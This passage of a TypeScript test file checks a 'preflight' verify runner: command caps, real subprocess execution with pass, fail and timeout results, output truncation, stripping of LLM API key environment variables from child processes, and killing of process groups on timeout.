      defaultCap.results.filter((r) => r.status === 'passed'),
    ).toHaveLength(8);
    expect(
      defaultCap.results.filter((r) => r.status === 'refused'),
    ).toHaveLength(2);

    spawnCommand.mockClear();
    const customCap = await runVerify(tenCandidates.slice(0, 4), [wf('pytest')], {
      cwd: '/repo',
      maxCommands: 2,
      spawnCommand,
    });
    expect(spawnCommand).toHaveBeenCalledTimes(2);
    expect(customCap.refusedCommands).toHaveLength(2);
  });
});

describe('executeCommand & runVerify (real subprocess execution)', () => {
  const tempDirs: string[] = [];

  function makeTempDir(): string {
    const dir = mkdtempSync(join(tmpdir(), 'preflight-verify-'));
    tempDirs.push(dir);
    return dir;
  }

  afterEach(() => {
    while (tempDirs.length > 0) {
      const dir = tempDirs.pop();
      if (dir !== undefined) {
        rmSync(dir, { recursive: true, force: true });
      }
    }
  });

  it('executes passing, failing, and timed-out commands via spawn(shell: false)', async () => {
    const dir = makeTempDir();
    writeFileSync(
      join(dir, 'pass.mjs'),
      "process.stdout.write('check passed output\\n'); process.exit(0);\n",
      'utf8',
    );
    writeFileSync(
      join(dir, 'fail.mjs'),
      "process.stderr.write('assertion error\\n'); process.exit(2);\n",
      'utf8',
    );
    writeFileSync(
      join(dir, 'hang.mjs'),
      'setTimeout(() => {}, 10_000);\n',
      'utf8',
    );

    const nodeBin = quoteIfNeeded(process.execPath);
    const passCmd = `${nodeBin} pass.mjs`;
    const failCmd = `${nodeBin} fail.mjs`;
    const hangCmd = `${nodeBin} hang.mjs`;

    const workflowFixtures: VerifyWorkflowCommand[] = [
      wf(passCmd),
      wf(failCmd),
      wf(hangCmd),
    ];

    // 1. Passing subprocess
    const passResult = await runVerify([passCmd], workflowFixtures, {
      cwd: dir,
      timeoutMs: 5_000,
    });
    expect(passResult.verdict).toBe('passed');
    expect(passResult.verdictMessage).toBe('these checks passed');
    expect(passResult.results[0]?.status).toBe('passed');
    expect(passResult.results[0]?.exitCode).toBe(0);
    expect(passResult.results[0]?.stdout).toContain('check passed output');

    // 2. Failing subprocess (non-zero exit code)
    const failResult = await runVerify([failCmd], workflowFixtures, {
      cwd: dir,
      timeoutMs: 5_000,
    });
    expect(failResult.verdict).toBe('failed');
    expect(failResult.verdictMessage).toBe('these checks failed');
    expect(failResult.results[0]?.status).toBe('failed');
    expect(failResult.results[0]?.exitCode).toBe(2);
    expect(failResult.results[0]?.stderr).toContain('assertion error');

    // 3. Timed-out subprocess
    const timeoutResult = await runVerify([hangCmd], workflowFixtures, {
      cwd: dir,
      timeoutMs: 150,
    });
    expect(timeoutResult.verdict).toBe('failed');
    expect(timeoutResult.verdictMessage).toBe('these checks failed');
    expect(timeoutResult.results[0]?.status).toBe('timed_out');
    expect(timeoutResult.results[0]?.exitCode).toBeNull();
  });

  it('caps stdout/stderr to maxOutputBytes keeping the tail and handles ENOENT cleanly', async () => {
    const dir = makeTempDir();
    writeFileSync(
      join(dir, 'noisy.mjs'),
      "process.stdout.write('START_' + 'x'.repeat(500) + '_TAIL_SUMMARY');\n",
      'utf8',
    );

    const noisyResult = await executeCommand(process.execPath, ['noisy.mjs'], {
      cwd: dir,
      timeoutMs: 5_000,
      maxOutputBytes: 64,
    });
    expect(noisyResult.status).toBe('passed');
    expect(noisyResult.exitCode).toBe(0);
    expect(Buffer.byteLength(noisyResult.stdout, 'utf8')).toBeLessThanOrEqual(64);
    expect(noisyResult.stdout).toContain('_TAIL_SUMMARY');
    expect(noisyResult.stdout).not.toContain('START_');

    const missingResult = await executeCommand(
      'preflight-definitely-missing-binary-xyz-999',
      [],
      {
        cwd: dir,
        timeoutMs: 5_000,
        maxOutputBytes: 1_024,
      },
    );
    expect(missingResult.status).toBe('failed');
    expect(missingResult.exitCode).toBeNull();
    expect(missingResult.stderr.length).toBeGreaterThan(0);
  });

  it('[R1-M5] strips all LLM API key env vars from child CI processes while keeping benign env vars', async () => {
    const dir = makeTempDir();
    writeFileSync(
      join(dir, 'inspect-env.mjs'),
      [
        'const keys = process.argv.slice(2);',
        'const out = {};',
        'for (const k of keys) out[k] = process.env[k] ?? null;',
        'process.stdout.write(JSON.stringify(out));',
      ].join('\n'),
      'utf8',
    );

    const benignKey = 'PREFLIGHT_TEST_SAFE_ENV_VAR';
    const saved = new Map<string, string | undefined>();
    const allChecked = [...STRIPPED_CHILD_ENV_KEYS, benignKey];
    for (const key of allChecked) {
      saved.set(key, process.env[key]);
    }

    try {
      for (const secretKey of STRIPPED_CHILD_ENV_KEYS) {
        process.env[secretKey] = `secret-value-for-${secretKey}`;
      }
      process.env[benignKey] = 'benign-visible-value';

      const res = await executeCommand(
        process.execPath,
        ['inspect-env.mjs', ...allChecked],
        {
          cwd: dir,
          timeoutMs: 5_000,
          maxOutputBytes: 4_096,
        },
      );

      expect(res.status).toBe('passed');
      const seen = JSON.parse(res.stdout) as Record<string, string | null>;
      for (const secretKey of STRIPPED_CHILD_ENV_KEYS) {
        expect(seen[secretKey]).toBeNull();
      }
      expect(seen[benignKey]).toBe('benign-visible-value');
    } finally {
      for (const [key, prev] of saved) {
        if (prev === undefined) {
          delete process.env[key];
        } else {
          process.env[key] = prev;
        }
      }
    }
  });

  it('[R1-N6] kills the child process group on timeout on POSIX so grandchildren do not leak', async () => {
    if (process.platform === 'win32') {
      return;
    }

    const dir = makeTempDir();
    const pidFile = join(dir, 'grandchild.pid');
    writeFileSync(
      join(dir, 'spawn-grandchild.mjs'),
      [
        "import { spawn } from 'node:child_process';",
        "import { writeFileSync } from 'node:fs';",
        "const child = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 30000)'], { stdio: 'ignore' });",
        `writeFileSync(${JSON.stringify(pidFile)}, String(child.pid), 'utf8');`,
        'setTimeout(() => {}, 30000);',
      ].join('\n'),
      'utf8',
    );

    const result = await executeCommand(
      process.execPath,
      ['spawn-grandchild.mjs'],
      {
        cwd: dir,
        timeoutMs: 400,
        maxOutputBytes: 1_024,
      },
    );

    expect(result.status).toBe('timed_out');
    expect(result.exitCode).toBeNull();

    let grandchildPid = 0;
    try {
      grandchildPid = Number.parseInt(readFileSync(pidFile, 'utf8').trim(), 10);
    } catch {
      // Parent timed out before writing pid file; still acceptable, nothing leaked.
    }
    if (Number.isInteger(grandchildPid) && grandchildPid > 0) {
      let alive = true;
      for (let attempt = 0; attempt < 10; attempt += 1) {
        try {
          process.kill(grandchildPid, 0);
        } catch {
          alive = false;
          break;
        }
        await new Promise((r) => setTimeout(r, 50));
      }
      if (alive) {
        try {
          process.kill(grandchildPid, 'SIGKILL');
        } catch {
          // ignore
        }
      }
      expect(alive).toBe(false);
    }
  });
});
